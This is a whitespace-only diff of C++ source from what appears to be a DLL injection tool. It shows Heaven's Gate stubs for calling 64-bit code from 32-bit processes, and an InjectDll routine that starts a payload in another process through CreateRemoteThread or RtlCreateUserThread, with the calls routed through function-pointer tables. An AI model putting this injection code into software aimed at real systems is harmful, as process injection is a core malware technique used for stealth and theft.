@@ -2,11 +2,11 @@
 #if HEAVENS_GATE && !_WIN64 
    #include "wow64ext\wow64ext.h"
 #else
-	DWORD64 __cdecl X64Call(DWORD64 func, int argC, ...) { return 0; }
-	DWORD64 __cdecl GetModuleHandle64(wchar_t* lpModuleName)  { return 0; }
-	DWORD64 __cdecl GetProcAddress64(DWORD64 hModule, char* funcName)  { return 0; }
-	DWORD64 __cdecl VirtualAllocEx64(HANDLE hProcess, DWORD64 lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)  { return 0; }
-	BOOL    __cdecl WriteProcessMemory64(HANDLE hProcess, DWORD64 lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten)  { return 0; }
+   DWORD64 __cdecl X64Call(DWORD64 func, int argC, ...) { return 0; }
+   DWORD64 __cdecl GetModuleHandle64(wchar_t* lpModuleName)  { return 0; }
+   DWORD64 __cdecl GetProcAddress64(DWORD64 hModule, char* funcName)  { return 0; }
+   DWORD64 __cdecl VirtualAllocEx64(HANDLE hProcess, DWORD64 lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)  { return 0; }
+   BOOL    __cdecl WriteProcessMemory64(HANDLE hProcess, DWORD64 lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten)  { return 0; }
 #endif
 
 struct InjectData32
@@ -183,20 +183,20 @@ BOOL InjectDll(BYTE *dllBuffer, HANDLE hProcess, BOOL x64)
          return FALSE;
 
       OSVERSIONINFOEXA osVersion    = { 0 };
-	   osVersion.dwOSVersionInfoSize = sizeof(osVersion);
-	   Funcs::pGetVersionExA((LPOSVERSIONINFOA) &osVersion); 
+      osVersion.dwOSVersionInfoSize = sizeof(osVersion);
+      Funcs::pGetVersionExA((LPOSVERSIONINFOA) &osVersion); 
       if(osVersion.dwMajorVersion <= 5)
-	   {
-		   if(!Funcs::pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) ((BYTE *) payloadRemoteAddress + sizeof(InjectData32)), (PVOID) payloadRemoteAddress, 0, NULL))
-			   return FALSE;
-	   }      
-	   else
-	   {
-	      HANDLE    hThread;
-		   CLIENT_ID clientId;
-		   if(Funcs::pRtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, ((BYTE *) payloadRemoteAddress + sizeof(InjectData32)), (PVOID) payloadRemoteAddress, &hThread, &clientId))
-			   return FALSE;   
-	   }
+      {
+         if(!Funcs::pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) ((BYTE *) payloadRemoteAddress + sizeof(InjectData32)), (PVOID) payloadRemoteAddress, 0, NULL))
+            return FALSE;
+      }      
+      else
+      {
+         HANDLE    hThread;
+         CLIENT_ID clientId;
+         if(Funcs::pRtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, ((BYTE *) payloadRemoteAddress + sizeof(InjectData32)), (PVOID) payloadRemoteAddress, &hThread, &clientId))
+            return FALSE;   
+      }
    }
 #endif
    return TRUE;
